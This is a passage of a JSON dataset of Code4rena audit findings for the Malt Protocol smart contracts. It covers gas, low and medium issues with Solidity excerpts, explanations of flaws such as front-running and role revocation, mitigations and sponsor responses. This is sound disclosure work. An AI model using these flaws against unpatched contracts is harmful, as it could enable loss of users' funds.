      "content": "\nSee @audit tag\n\n```solidity\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    uint256 totalCapital;\n    uint256[] memory traderCapital = new uint256[](length);\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];  // @audit gas: should use  'swingTraders[traderIds[i]]'\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderBalance = collateralToken.balanceOf(trader.traderContract);\n      totalCapital += traderBalance;\n      traderCapital[i] = traderBalance;\n    }\n\n    if (totalCapital == 0) {\n      return 0;\n    }\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]]; // @audit gas: should use  'swingTraders[traderIds[i]]'\n      uint256 share = (maxCapital * traderCapital[i]) / totalCapital;\n\n      if (share == 0) {\n        continue;\n      }\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-03-swingtradermanagerbuymalt-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16105",
      "title": "[G-02] `GlobalImpliedCollateralService.swingTraderCollateralRatio()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function swingTraderCollateralRatio() public view returns (uint256) {\n    uint256 decimals = malt.decimals();\n    uint256 totalSupply = malt.totalSupply();\n\n    if (totalSupply == 0) {\n      return 0;\n    }\n\n    return (collateral.swingTrader * (10**decimals)) / malt.totalSupply(); // @audit gas: should use  '... / totalSupply'\n  }\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-02-globalimpliedcollateralserviceswingtradercollateralratio-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16104",
      "title": "[G-01] Increments can be unchecked",
      "impact": "GAS",
      "content": "\nIn Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\nhttps://github.com/ethereum/solidity/issues/10695\n\nInstances include:\n\n```\nMaltRepository.grantRoleMultiple()#132:    for (uint256 i; i < length; ++i) {\nMaltRepository._setup()#188:    for (uint256 i; i < length; ++i) {\nRewardThrottle.checkRewardUnderflow()#446:      for (uint256 i = _activeEpoch; i < epoch; ++i) {\nRewardThrottle._sendToDistributor()#590:    for (uint256 i; i < length; ++i) {\nRewardThrottle._fillInEpochGaps()#639:    for (uint256 i = _activeEpoch + 1; i <= epoch; ++i) {\nRewardThrottle.populateFromPreviousThrottle()#667:    for (uint256 i = _activeEpoch; i < epoch; ++i) {\nSwingTraderManager.buyMalt()#154:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.buyMalt()#170:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.sellMalt()#208:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.sellMalt()#224:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.costBasis()#269:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.calculateSwingTraderMaltRatio()#300:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.getTokenBalances()#330:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.delegateCapital()#348:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.delegateCapital()#366:    for (uint256 i; i < length; ++i) {\nSwingTraderManager.deployedCapital()#389:    for (uint256 i; i < length; ++i) {\n```\n\nThe code would go from:\n\n```\nfor (uint256 i; i < numIterations; ++i) {  \n // ...  \n}  \n```\n\nto\n\n```\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-01-increments-can-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "16103",
      "title": "[L-09] `priceTarget` seems to be set to wrong value in `_triggerSwingTrader`",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L353-L355\n\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L303-L306\n\nIn `StabilizerNode._triggerSwingTrader`, `priceTarget` is set to `icTotal` when `exchangeRate` < `icTotal`.\n\n```solidity\n    if (exchangeRate < icTotal) {\n      priceTarget = icTotal;\n    }\n```\nIf `icTotal` is slightly greater than `exchangeRate`, `priceTarget` can be `exchangeRate` + dust.\n\nBut in `_shouldAdjustSupply`, `exchangeRate` should be less than some margin of `priceTarget` to proceed actual stabilization.\n\n```solidity\n     return\n      (exchangeRate <= (priceTarget - lowerThreshold) &&\n        !auction.auctionExists(auction.currentAuctionId())) ||\n      exchangeRate >= (priceTarget + upperThreshold);\n```\nSo the `priceTarget` updating logic seems incorrect.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-09-pricetarget-seems-to-be-set-to-wrong-value-in-_triggerswingtrader",
      "tags": [],
      "finders": []
    },
    {
      "id": "16102",
      "title": "[L-08] `swingTraderManager.getTokenBalances` contains inactive swingTrader's balances",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L322-L335\n\n`swingTraderManager.getTokenBalances` doesn't check if swingTrader is active and adds balances regardless of the active status.\n\n```solidity\n  function getTokenBalances()\n    external\n    view\n    returns (uint256 maltBalance, uint256 collateralBalance)\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];\n      maltBalance += malt.balanceOf(trader.traderContract);\n      collateralBalance += collateralToken.balanceOf(trader.traderContract);\n    }\n  }\n```\nBut in `buyMalt` and `sellMalt`, they only account for balances of active swing traders. This mismatch might cause wrong calculations where `getTokenBalances` are used.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-08-swingtradermanagergettokenbalances-contains-inactive-swingtraders-balances",
      "tags": [],
      "finders": []
    },
    {
      "id": "16101",
      "title": "[L-07] `_triggerSwingTrader` doesn't try `dexHandler.buyMalt` after `swingTraderManager.buyMalt`",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L357-L370\n\n`_triggerSwingTrader` doesn't try `dexHandler.buyMalt` after `swingTraderManager.buyMalt`. If capitalUsed is less than purchaseAmount, we can try `dexHandler.buyMalt` with `purchaseAmount` - `capitalUsed`. But current implementation doesn't try `dexHandler.buyMalt` and it misses possible stabilization.\n\n```solidity\n    uint256 purchaseAmount = dexHandler.calculateBurningTradeSize(priceTarget);\n\n    if (purchaseAmount > preferAuctionThreshold) {\n      uint256 capitalUsed = swingTraderManager.buyMalt(purchaseAmount);\n\n      uint256 callerCut = (capitalUsed * callerRewardCutBps) / 10000;\n\n      if (callerCut != 0) {\n        malt.mint(msg.sender, callerCut);\n        emit MintMalt(callerCut);\n      }\n    } else {\n      _startAuction(originalPriceTarget);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-07-_triggerswingtrader-doesnt-try-dexhandlerbuymalt-after-swingtradermanagerbuymalt",
      "tags": [],
      "finders": []
    },
    {
      "id": "16100",
      "title": "[L-06] All balance wasn't sent, some dust would be remained in `_sendToDistributor`",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L124-L128\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L591-L601\n\nIn `RewardThrottle.handleReward`, `_sendToDistributor` is called for left balance. \n```solidity\n    if (balance > 0) {\n      _sendToDistributor(balance, _activeEpoch);\n    }\n\n    emit HandleReward(epoch, balance);\n```\n\nBut in the implementation of `_sendToDistributor`, balance will be split to distributors.\n\n```solidity\n     uint256 share = (amount * allocations[i]) / 1e18;\n     ...\n     collateralToken.safeTransfer(distributors[i], share);\n```\nSo some dust will remain in `RewardThrottle` and the actual rewarded amount can be slightly less than balance in `handleReward`. And the event amount(=balance) will be slightly larger than actual rewarded amount.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-06-all-balance-wasnt-sent-some-dust-would-be-remained-in-_sendtodistributor",
      "tags": [],
      "finders": []
    },
    {
      "id": "16099",
      "title": "[L-05] `updateDesiredAPR` might revert when `aprFloor` < `maxAdjustment`, so aprFloor(2%) must be greater than maxAdjustment(0.5%)",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L131-L183\n\n\n```solidity\n  function updateDesiredAPR() public onlyActive {\n    ...\n    uint256 newAPR = targetAPR; // gas\n    uint256 adjustmentCap = maxAdjustment; // gas\n    \n    ...\n\n      if (adjustment > adjustmentCap) {\n        adjustment = adjustmentCap;\n      }\n\n      newAPR -= adjustment;\n    }\n\n    uint256 cap = aprCap; // gas\n    uint256 floor = aprFloor; // gas\n    if (newAPR > cap) {\n      newAPR = cap;\n    } else if (newAPR < floor) {\n      newAPR = floor;\n    }\n\n    targetAPR = newAPR;\n    aprLastUpdated = block.timestamp;\n    emit UpdateDesiredAPR(newAPR);\n  }\n```\n\nIf `aprFloor` < `maxAdjustment`, `newAPR` can be `aprFloor` and `adjustment` can be `maxAdjustment`, so \n`newAPR -= adjustment` will revert. So it needs to make sure that `aprFloor` > `maxAdjustment`.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-05-updatedesiredapr-might-revert-when-aprfloor--maxadjustment-so-aprfloor2-must-be-greater-than-maxadjustment05",
      "tags": [],
      "finders": []
    },
    {
      "id": "16098",
      "title": "[L-04] tradeSize will be only 100%, 50%, 33%, ... because of expansionDampingFactor",
      "impact": "LOW",
      "content": "- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L393-L394\n\n\n```solidity\n    uint256 tradeSize = dexHandler.calculateMintingTradeSize(priceTarget) /\n      expansionDampingFactor;\n```\n\n`tradeSize` will be only 100%, 50%, 33%, ... of minting trade size calculated from `dexHandler`. I think this is intended, but it can be generalized by basis points or 10**18 so it can support other percentages as follows.\n\n```solidity\n    uint256 tradeSize = dexHandler.calculateMintingTradeSize(priceTarget) * 10000 / expansionDampingFactorBPS;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-04-tradesize-will-be-only-100-50-33--because-of-expansiondampingfactor",
      "tags": [],
      "finders": []
    },
    {
      "id": "16097",
      "title": "[L-03] `skipAuctionThreshold` < `preferAuctionThreshold` should be checked",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L359-L370\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L437-L439\n\n```solidity\n    if (purchaseAmount > preferAuctionThreshold) {\n        ...\n    } else {\n      _startAuction(originalPriceTarget);\n    }\n```\n```solidity\n    if (purchaseAmount < skipAuctionThreshold) {\n      return;\n    }\n```    \n\n`skipAuctionThreshold` should be less than `preferAuctionThreshold`.\n\nIn `StabilizerNode._triggerSwingTrader`, it starts auction when purchaseAmount <= preferAuctionThreshold.\n\nIf `skipAuctionThreshold` >= `preferAuctionThreshold`, `purchaseAmount` <= `skipAuctionThreshold` always holds.\n\nSo in `_startAuction`, it will never starts an auction and does nothing. So the `stabilize` will not work in this case. It is recommended to check if `skipAuctionThreshold` < `preferAuctionThreshold` when `skipAuctionThreshold` and `preferAuctionThreshold` are set by the admin.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-03-skipauctionthreshold--preferauctionthreshold-should-be-checked",
      "tags": [],
      "finders": []
    },
    {
      "id": "16096",
      "title": "[L-02] `primedBlock` is reset to 0 instead of block.number",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L224\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L321-L326\n\n`primedBlock` is reset to 0 instead of `block.number` in `StabilizerNode.stabilize`. \n```solidity\n    primedBlock = 0; \n```\nIf `primedBlock` = 0, `block.number > primedBlock + primedWindow` holds in most cases and the next caller of `_validateSwingTraderTrigger` will always get default incentive. But this incentive is meaningless.\n```solidity\n      if (block.number > primedBlock + primedWindow) {\n        primedBlock = block.number;\n        malt.mint(msg.sender, defaultIncentive * (10**malt.decimals()));\n        emit MintMalt(defaultIncentive * (10**malt.decimals()));\n        return false;\n      }\n```\nSo it is recommended to reset `primedBlock` to `block.number` instead of 0.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-02-primedblock-is-reset-to-0-instead-of-blocknumber",
      "tags": [],
      "finders": []
    },
    {
      "id": "16095",
      "title": "[L-01] `runwayDays` might be longer than it should be due to possible rounding issue",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L399\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L406\n\n```solidity\n        uint256 epochsPerDay = 86400 / timekeeper.epochLength();\n        ...\n        runwayDays = runwayEpochs / epochsPerDay;\n```\n\nWhen 86400 is not a multiple of `timekeeper.epochLength()`, `runwayDays` might be longer than it should be.\nLet us assume that `timekeeper.epochLength()` = 43201 (about half a day), and `runwayEpochs` = 360 (about 180 days).\n\n`runwayDays` should be `runwayEpochs * timekeeper.epochLength() / 86400` = 180, but in the above implementation, `epochsPerDay` = 1 and `runwayDays` = 360. \n\nIt is recommended to use `runwayDays = runwayEpochs * timekeeper.epochLength() / 86400` directly without the middle variable `epochsPerDay`.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#l-01-runwaydays-might-be-longer-than-it-should-be-due-to-possible-rounding-issue",
      "tags": [],
      "finders": []
    },
    {
      "id": "16094",
      "title": "[M-16] MaltRepository._revokeRole may not work correctly",
      "impact": "MEDIUM",
      "content": "\nMaltRepository inherits from AccessControl and adds validation of validRoles to the hasRole function, which means that even if super.hasRole(role, account) == true, if validRoles\\[role] == false hasRole will return false, which will cause `\\_revokeRole` to not work correctly.\n\n```solidity\n  function hasRole(bytes32 role, address account)\n    public\n    view\n    override\n    returns (bool)\n  {\n    // Timelock has all possible permissions\n    return\n      (super.hasRole(role, account) && validRoles[role]) ||\n      super.hasRole(TIMELOCK_ROLE, account);\n  }\n```\n\nConsider the case where Alice is granted ADMIN_ROLE, then ADMIN_ROLE is removed in the removeRole function, validRoles\\[ADMIN_ROLE] == false.\n\n```solidity\n  function removeRole(bytes32 role) external onlyRole(getRoleAdmin(role)) {\n    validRoles[role] = false;\n    emit RemoveRole(role);\n  }\n```\n\nNow if the revokeRole function is called on Alice, in the `\\_revokeRole`, since hasRole returns false, Alice's ADMIN_ROLE will not be revoked.\n\nSince removeRole ends silently, this may actually cause the caller to incorrectly assume that Alice's ADMIN_ROLE has been revoked:\n\n```solidity\n    function _revokeRole(bytes32 role, address account) internal virtual {\n        if (hasRole(role, account)) {\n            _roles[role].members[account] = false;\n            emit RoleRevoked(role, account, _msgSender());\n        }\n    }\n```\n\nIn addition, the renounceRole and `\\_transferRole` functions will also be affected.\n\nIn particular, the `\\_transferRole` function, if you want to transfer Alice's role to Bob, both Alice and Bob will have the role if validRoles\\[role]==false.\n\n```solidity\n  function _transferRole(\n    address newAccount,\n    address oldAccount,\n    bytes32 role\n  ) internal {\n    _revokeRole(role, oldAccount);\n    _grantRole(role, newAccount);\n  }\n...\n    function renounceRole(bytes32 role, address account) public virtual override {\n        require(account == _msgSender(), \"AccessControl: can only renounce roles for self\");\n\n        _revokeRole(role, account);\n    }\n```\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/Repository.sol#L64-L74> \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/Repository.sol#L99-L102>\n\n### Recommended Mitigation Steps\n\nOverride renounceRole and removeRole in the MaltRepository and modify them as follows:\n\n```diff\n    function renounceRole(bytes32 role, address account) public virtual override {\n+     require(validRoles[role], \"Unknown role\");\n        require(account == _msgSender(), \"AccessControl: can only renounce roles for self\");\n\n        _revokeRole(role, account);\n    }\n...\n    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {\n+     require(validRoles[role], \"Unknown role\");\n        _revokeRole(role, account);\n    }\n...\n  function _transferRole(\n    address newAccount,\n    address oldAccount,\n    bytes32 role\n  ) internal {\n+  require(validRoles[role], \"Unknown role\");\n    _revokeRole(role, oldAccount);\n    _grantRole(role, newAccount);\n  }\n```\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/5)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the MaltRepository smart contract. The vulnerability is caused by the hasRole function, which is inherited from AccessControl and adds validation of validRoles to the hasRole function. This causes the revokeRole, renounceRole, and _transferRole functions to not work correctly. \n\nThe impact of this vulnerability is that if a user is granted a certain role, then that role is removed in the removeRole function, validRoles[role] will be set to false. When the revokeRole function is called on the user, the user's role will not be revoked since hasRole will return false. This may cause the caller to incorrectly assume that the user's role has been revoked. In addition, the renounceRole and _transferRole functions will also be affected.\n\nThe suggested mitigation steps are to override renounceRole and removeRole in the MaltRepository and modify them to require validRoles[role]. This will ensure that roles are only revoked, renounced, and transferred if validRoles[role] is true.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/5",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16093",
      "title": "[M-15] LinearDistributor.declareReward: previouslyVested may update incorrectly, which will cause some rewards to be lost",
      "impact": "MEDIUM",
      "content": "\nIn LinearDistributor.declareReward, distributed represents the reward to distribute and is calculated using netVest(currentlyVested - previouslyVested).\n\nAt the same time, distributed cannot exceed balance, which means that `if balance < linearBondedValue /ast netVest / vestingBondedValue`, part of the rewards in netVest will be lost.\n\n```solidity\n    uint256 netVest = currentlyVested - previouslyVested;\n    uint256 netTime = block.timestamp - previouslyVestedTimestamp;\n\n    if (netVest == 0 || vestingBondedValue == 0) {\n      return;\n    }\n\n    uint256 linearBondedValue = rewardMine.valueOfBonded();\n\n    uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;\n    uint256 balance = collateralToken.balanceOf(address(this));\n\n    if (distributed > balance) {\n      distributed = balance;\n    }\n\n```\n\nAt the end of the function, previouslyVested is directly assigned to currentlyVested instead of using the Vested adjusted according to distributed, which means that the previously lost rewards will also be skipped in the next distribution.\n\n```solidity\n    previouslyVested = currentlyVested;\n    previouslyVestedTimestamp = block.timestamp;\n```\n\nAlso, in the next distribution, bufferRequirement will be small because distributed is small, so it may increase the number of forfeits.\n\n        if (netTime < buf) {\n          bufferRequirement = (distributed * buf * 10000) / netTime / 10000;\n        } else {\n          bufferRequirement = distributed;\n        }\n\n        if (balance > bufferRequirement) {\n          // We have more than the buffer required. Forfeit the rest\n          uint256 net = balance - bufferRequirement;\n          _forfeit(net);\n        }\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/LinearDistributor.sol#L111-L153>\n\n### Recommended Mitigation Steps\n\nConsider adapting previouslyVested based on distributed:\n\n```diff\n    uint256 linearBondedValue = rewardMine.valueOfBonded();\n\n    uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;\n    uint256 balance = collateralToken.balanceOf(address(this));\n\n    if (distributed > balance) {\n      distributed = balance;\n+    currentlyVested = distributed * vestingBondedValue / linearBondedValue + previouslyVested;\n    }\n```\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/6#issuecomment-1447053148):**\n > Finding is correct as stated. I'm not sure how we would ever get into the state required to manifest the bug. Obviously the implementation is incorrect though, so will be fixed.\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the LinearDistributor.declareReward function of the RewardSystem contract. The vulnerability occurs when the reward to distribute, represented by the variable distributed, is calculated using netVest (currentlyVested - previouslyVested). In this case, distributed cannot exceed balance, meaning that if balance is less than linearBondedValue * netVest / vestingBondedValue, part of the rewards in netVest will be lost. \n\nAt the end of the function, previouslyVested is directly assigned to currentlyVested instead of using the Vested adjusted according to distributed, which means that the previously lost rewards will also be skipped in the next distribution. This can lead to a decrease in bufferRequirement, which can increase the number of forfeits. \n\nA proof of concept is provided in the report, as well as a recommended mitigation step. The recommended step is to adapt previouslyVested based on distributed, as shown in the code snippet provided. \n\nOverall, this bug report discusses a vulnerability in the LinearDistributor.declareReward function of the RewardSystem contract, and provides a proof of concept and a recommended mitigation step.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/6",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16092",
      "title": "[M-14] RewardThrottle.populateFromPreviousThrottle may be exposed to front-run attack",
      "impact": "MEDIUM",
      "content": "\nRewardThrottle.populateFromPreviousThrottle allows ADMIN_ROLE to use epochData from previousThrottle to populate state from activeEpoch to epoch in current RewardThrottle.\n\n```solidity\n  function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")\n  {\n    RewardThrottle previous = RewardThrottle(previousThrottle);\n    uint256 _activeEpoch = activeEpoch; // gas\n\n    for (uint256 i = _activeEpoch; i < epoch; ++i) {\n      (\n        uint256 profit,\n        uint256 rewarded,\n        uint256 bondedValue,\n        uint256 desiredAPR,\n        uint256 epochsPerYear,\n        uint256 cumulativeCashflowApr,\n        uint256 cumulativeApr\n      ) = previous.epochData(i);\n\n      state[i].bondedValue = bondedValue;\n      state[i].profit = profit;\n      state[i].rewarded = rewarded;\n      state[i].epochsPerYear = epochsPerYear;\n      state[i].desiredAPR = desiredAPR;\n      state[i].cumulativeCashflowApr = cumulativeCashflowApr;\n      state[i].cumulativeApr = cumulativeApr;\n    }\n\n    activeEpoch = epoch;\n  }\n```\n\nBut since populateFromPreviousThrottle and `\\_fillInEpochGaps` have basically the same function, a malicious user can call fillInEpochGaps to front-run populateFromPreviousThrottle.\n\n```solidity\n  function _fillInEpochGaps(uint256 epoch) internal {\n    uint256 epochsPerYear = timekeeper.epochsPerYear();\n    uint256 _activeEpoch = activeEpoch; // gas\n\n    state[_activeEpoch].bondedValue = bonding.averageBondedValue(_activeEpoch);\n    state[_activeEpoch].epochsPerYear = epochsPerYear;\n    state[_activeEpoch].desiredAPR = targetAPR;\n\n    if (_activeEpoch > 0) {\n      state[_activeEpoch].cumulativeCashflowApr =\n        state[_activeEpoch - 1].cumulativeCashflowApr +\n        epochCashflowAPR(_activeEpoch - 1);\n      state[_activeEpoch].cumulativeApr =\n        state[_activeEpoch - 1].cumulativeApr +\n        epochAPR(_activeEpoch - 1);\n    }\n\n    // Avoid issues if gap between rewards is greater than one epoch\n    for (uint256 i = _activeEpoch + 1; i <= epoch; ++i) {\n      if (!state[i].active) {\n        state[i].bondedValue = bonding.averageBondedValue(i);\n        state[i].profit = 0;\n        state[i].rewarded = 0;\n        state[i].epochsPerYear = epochsPerYear;\n        state[i].desiredAPR = targetAPR;\n        state[i].cumulativeCashflowApr =\n          state[i - 1].cumulativeCashflowApr +\n          epochCashflowAPR(i - 1);\n        state[i].cumulativeApr = state[i - 1].cumulativeApr + epochAPR(i - 1);\n        state[i].active = true;\n      }\n    }\n\n    activeEpoch = epoch;\n  }\n```\n\nThe only difference is that it seems that populateFromPreviousThrottle can make epoch and activeEpoch greater than `timekeeper.epoch()`, thereby updating the state for future epochs, but `\\_fillInEpochGaps` makes `activeEpoch = timekeeper.epoch()`, thereby invalidating populateFromPreviousThrottle for future updates. (This usage should be very unlikely).\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L660-L688>\n\n### Recommended Mitigation Steps\n\nIf populateFromPreviousThrottle is used to initialize the state in the current RewardThrottle, it should be called on contract setup.\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/8#issuecomment-1447048647):**\n > As per [#20](https://github.com/code-423n4/2023-02-malt-findings/issues/20), we will be removing the `fillInEpochGaps` method.\n\n***\n\n",
      "summary": "\nA bug report has been submitted for the RewardThrottle.sol contract in the RewardSystem found on the GitHub repository code-423n4/2023-02-malt. The bug is that the function populateFromPreviousThrottle allows the ADMIN_ROLE to use epochData from a previousThrottle to populate the state from activeEpoch to epoch in the current RewardThrottle. However, a malicious user can call the fillInEpochGaps function to front-run populateFromPreviousThrottle, invalidating it for future updates. This bug is demonstrated in the code provided in the report.\n\nThe impact of this bug is that the malicious user can front-run populateFromPreviousThrottle and invalidate it for future updates.\n\nNo tools were used to identify this bug.\n\nThe recommended mitigation step to avoid this bug is to call populateFromPreviousThrottle on contract setup if it is being used to initialize the state in the current RewardThrottle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/8",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16091",
      "title": "[M-13] Function `stabilize()` might always revert because of overflow since Malt contract use solidity 0.8",
      "impact": "MEDIUM",
